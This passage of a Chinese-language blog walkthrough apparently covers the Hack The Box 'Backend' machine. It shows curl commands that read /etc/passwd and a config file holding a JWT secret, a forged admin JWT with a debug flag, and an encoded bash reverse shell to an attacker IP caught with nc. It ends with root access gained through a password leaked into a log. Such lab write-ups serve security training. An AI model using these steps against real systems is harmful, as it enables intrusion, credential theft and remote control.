class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;PassWord1&quot;&#125;&#x27;</span> http://10.10.11.161/api/v1/user/login -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span><br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:[&#123;<span class="hljs-string">&quot;loc&quot;</span>:[<span class="hljs-string">&quot;body&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>],<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;field required&quot;</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;value_error.missing&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;loc&quot;</span>:[<span class="hljs-string">&quot;body&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>],<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;field required&quot;</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;value_error.missing&quot;</span>&#125;]&#125;                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&#x27;&#123;&quot;username&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;PassWord1&quot;&#125;&#x27;</span> http://10.10.11.161/api/v1/user/login -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> |jq .<br>&#123;<br>  <span class="hljs-string">&quot;detail&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;loc&quot;</span>: [<br>        <span class="hljs-string">&quot;body&quot;</span>,<br>        <span class="hljs-string">&quot;username&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;field required&quot;</span>,<br>      <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;value_error.missing&quot;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-string">&quot;loc&quot;</span>: [<br>        <span class="hljs-string">&quot;body&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;field required&quot;</span>,<br>      <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;value_error.missing&quot;</span><br>    &#125;<br>  ]<br>&#125;<br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&#x27;username=crazy@inside.htb&amp;password=PassWord1&#x27;</span> http://10.10.11.161/api/v1/user/login <br>&#123;<span class="hljs-string">&quot;access_token&quot;</span>:<span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA2NjcwLCJpYXQiOjE2NjE2MTU0NzAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiM2JjM2VkODItODdhNC00NjQ0LWE2ZmUtODAyOTI1MTE4NGRlIn0.xITdqMmDHhMIu5sLjrL3eKJlQYDLDs7rkfbC71MOrgA&quot;</span>,<span class="hljs-string">&quot;token_type&quot;</span>:<span class="hljs-string">&quot;bearer&quot;</span>&#125; <br></code></pre></td></tr></table></figure><p>JWT:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA2NjcwLCJpYXQiOjE2NjE2MTU0NzAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiM2JjM2VkODItODdhNC00NjQ0LWE2ZmUtODAyOTI1MTE4NGRlIn0.xITdqMmDHhMIu5sLjrL3eKJlQYDLDs7rkfbC71MOrgA&quot;</span>|<span class="hljs-built_in">base64</span> -d<br>&#123;<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;HS256&quot;</span>,<span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;JWT&quot;</span>&#125;<span class="hljs-built_in">base64</span>: 输入无效<br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://10.10.11.161/docs -H <span class="hljs-string">&quot;Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA2NjcwLCJpYXQiOjE2NjE2MTU0NzAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiM2JjM2VkODItODdhNC00NjQ0LWE2ZmUtODAyOTI1MTE4NGRlIn0.xITdqMmDHhMIu5sLjrL3eKJlQYDLDs7rkfbC71MOrgA&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220827200134823.png" alt="image-20220827200134823"></p><p>这更新密码好像只需要提交用户的GUID：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220827200316188.png" alt="image-20220827200316188"></p><p>显示了201，似乎成功了？</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220827200420516.png" alt="image-20220827200420516"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;POST&#x27;</span> \<br>  <span class="hljs-string">&#x27;http://10.10.11.161/api/v1/admin/file&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.8BMwdnGZComGLOk5rBDGM83lpnOGGFtFAlkTCVkRj-E&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">  &quot;file&quot;: &quot;/etc/passwd&quot;</span><br><span class="hljs-string">&#125;&#x27;</span><br>&#123;<span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n&quot;</span>&#125;       <br></code></pre></td></tr></table></figure><p>尝试执行命令会报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;GET&#x27;</span> \ <br>  <span class="hljs-string">&#x27;http://10.10.11.161/api/v1/admin/exec/id&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.8BMwdnGZComGLOk5rBDGM83lpnOGGFtFAlkTCVkRj-E&#x27;</span><br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;Debug key missing from JWT&quot;</span>&#125;    <br></code></pre></td></tr></table></figure><p>在配置文件里包含了JWT的秘钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;POST&#x27;</span> \<br>  <span class="hljs-string">&#x27;http://10.10.11.161/api/v1/admin/file&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.8BMwdnGZComGLOk5rBDGM83lpnOGGFtFAlkTCVkRj-E&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">  &quot;file&quot;: &quot;/home/htb/uhc/app/core/config.py&quot;</span><br><span class="hljs-string">&#125;&#x27;</span><br>&#123;<span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator\nfrom typing import List, Optional, Union\n\nfrom enum import Enum\n\n\nclass Settings(BaseSettings):\n    API_V1_STR: str = \&quot;/api/v1\&quot;\n    JWT_SECRET: str = \&quot;SuperSecretSigningKey-HTB\&quot;\n    ALGORITHM: str = \&quot;HS256\&quot;\n\n    # 60 minutes * 24 hours * 8 days = 8 days\n    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8\n\n    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins\n    # e.g: &#x27;[\&quot;http://localhost\&quot;, \&quot;http://localhost:4200\&quot;, \&quot;http://localhost:3000\&quot;, \\\n    # \&quot;http://localhost:8080\&quot;, \&quot;http://local.dockertoolbox.tiangolo.com\&quot;]&#x27;\n    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []\n\n    @validator(\&quot;BACKEND_CORS_ORIGINS\&quot;, pre=True)\n    def assemble_cors_origins(cls, v: Union[str, List[str]]) -&gt; Union[List[str], str]:\n        if isinstance(v, str) and not v.startswith(\&quot;[\&quot;):\n            return [i.strip() for i in v.split(\&quot;,\&quot;)]\n        elif isinstance(v, (list, str)):\n            return v\n        raise ValueError(v)\n\n    SQLALCHEMY_DATABASE_URI: Optional[str] = \&quot;sqlite:///uhc.db\&quot;\n    FIRST_SUPERUSER: EmailStr = \&quot;root@ippsec.rocks\&quot;    \n\n    class Config:\n        case_sensitive = True\n \n\nsettings = Settings()\n&quot;</span>&#125;                                                                                                                <br></code></pre></td></tr></table></figure><p>解码JWT令牌：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ python<br>Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; import jwt<br>&gt;&gt;&gt; token = <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.8BMwdnGZComGLOk5rBDGM83lpnOGGFtFAlkTCVkRj-E&quot;</span>&gt;&gt;&gt; secret = <span class="hljs-string">&quot;SuperSecretSigningKey-HTB&quot;</span><br>&gt;&gt;&gt; decoded = jwt.decode(token, secret, [<span class="hljs-string">&quot;HS256&quot;</span>])<br>&gt;&gt;&gt; decoded<br>&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;access_token&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>: 1662308339, <span class="hljs-string">&#x27;iat&#x27;</span>: 1661617139, <span class="hljs-string">&#x27;sub&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;is_superuser&#x27;</span>: True, <span class="hljs-string">&#x27;guid&#x27;</span>: <span class="hljs-string">&#x27;36c2e94a-4271-4259-93bf-c96ad5948284&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>设置Debug键重新生成令牌：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>decoded[<span class="hljs-string">&quot;debug&quot;</span>] = <span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>jwt.encode(decoded, secret, <span class="hljs-string">&quot;HS256&quot;</span>)<br><span class="hljs-string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.UZ5Z0tKEn0__lRkAZS2DqEfYAwJJy4-FA3K0BSze8OA&#x27;</span><br></code></pre></td></tr></table></figure><p>尝试执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;GET&#x27;</span> http://10.10.11.161/api/v1/admin/exec/id -H <span class="hljs-string">&#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.UZ5Z0tKEn0__lRkAZS2DqEfYAwJJy4-FA3K0BSze8OA&#x27;</span> <br><span class="hljs-string">&quot;uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)&quot;</span>      <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;GET&#x27;</span> <span class="hljs-string">&#x27;http://10.10.11.161/api/v1/admin/exec/echo%20&quot;YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzEzMzcgMD4mMSIK&quot;|base64%20-d|bash&#x27;</span> -H <span class="hljs-string">&#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.UZ5Z0tKEn0__lRkAZS2DqEfYAwJJy4-FA3K0BSze8OA&#x27;</span> <br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ nc -lvnp 1337         <br>listening on [any] 1337 ...<br>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.161] 42262<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (673): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>htb@Backend:~/uhc$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(htb) gid=1000(htb) <span class="hljs-built_in">groups</span>=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)<br>htb@Backend:~/uhc$       <br></code></pre></td></tr></table></figure><p>在用户目录下有一个uhc,里边记录着一些登录记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@Backend:~/uhc$ <span class="hljs-built_in">cat</span> auth.log<br><span class="hljs-built_in">cat</span> auth.log<br>08/27/2022, 13:16:45 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 13:20:05 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 13:33:25 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 13:36:45 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 13:41:45 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 13:45:05 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 13:58:25 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 14:06:45 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 14:08:25 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 14:15:05 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 14:23:25 - Login Failure <span class="hljs-keyword">for</span> Tr0ub4dor&amp;3<br>08/27/2022, 14:25:00 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 14:25:05 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 14:25:25 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 14:26:45 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 14:31:45 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 14:38:25 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 15:51:09 - Login Success <span class="hljs-keyword">for</span> crazy@inside.htb<br>08/27/2022, 16:14:53 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 16:18:59 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>htb@Backend:~/uhc$ <br></code></pre></td></tr></table></figure><p>其中的Tr0ub4dor&amp;3不像是一个用户名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@Backend:~/uhc$ su -<br>su -<br>Password: Tr0ub4dor&amp;3<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>script -qc /bin/bash /dev/null<br>root@Backend:~<span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br>e08................................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
